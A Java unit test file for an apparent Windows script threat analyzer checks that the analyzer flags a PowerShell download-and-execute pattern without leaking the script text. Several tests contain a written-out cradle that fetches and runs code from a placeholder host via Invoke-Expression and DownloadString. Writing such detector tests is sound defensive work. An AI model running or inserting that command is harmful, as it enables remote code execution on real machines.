package com.aiwatchdog.backend.windowstelemetry;

import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Instant;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class ScriptThreatAnalyzerTest {
    private final ScriptThreatAnalyzer analyzer = new ScriptThreatAnalyzer();

    @Test
    void detectsIndicatorsInScriptFileWithoutReturningSourceText() throws Exception {
        Path script = Files.createTempFile("aiwatchdog-script-", ".ps1");
        try {
            Files.writeString(script,
                    "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://example.invalid/a')",
                    StandardCharsets.UTF_8);

            var result = analyzer.inspectFile(script);

            assertTrue(result.isPresent());
            assertTrue(result.orElseThrow().evidence().contains("DOWNLOAD_AND_EXECUTE_PATTERN"));
            assertFalse(result.orElseThrow().toString().contains("example.invalid"));
        } finally {
            Files.deleteIfExists(script);
        }
    }

    @Test
    void assemblesBoundedPowerShellEventFragmentsBeforeAnalysis() {
        Instant observedAt = Instant.parse("2026-01-01T00:00:00Z");

        assertTrue(analyzer.inspectObservedFragment("OBSERVED_POWERSHELL_SCRIPT_BLOCK", "block-1", 1, 2,
                "Invoke-Expression (New-Object Net.WebClient).", observedAt).isEmpty());
        var result = analyzer.inspectObservedFragment("OBSERVED_POWERSHELL_SCRIPT_BLOCK", "block-1", 2, 2,
                "DownloadString('https://example.invalid/a')", observedAt);

        assertTrue(result.isPresent());
        assertTrue(result.orElseThrow().evidence().contains("DOWNLOAD_AND_EXECUTE_PATTERN"));
        assertEquals(observedAt, result.orElseThrow().observedAt());
        assertFalse(result.orElseThrow().toString().contains("example.invalid"));
    }

    @Test
    void reportsSameScriptContentAtDifferentPathsIndependently() throws Exception {
        Path first = Files.createTempFile("aiwatchdog-script-first-", ".ps1");
        Path second = Files.createTempFile("aiwatchdog-script-second-", ".ps1");
        String content = "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://example.invalid/a')";
        try {
            Files.writeString(first, content, StandardCharsets.UTF_8);
            Files.writeString(second, content, StandardCharsets.UTF_8);

            assertTrue(analyzer.inspectFile(first).isPresent());
            assertTrue(analyzer.inspectFile(second).isPresent());
        } finally {
            Files.deleteIfExists(first);
            Files.deleteIfExists(second);
        }
    }
}
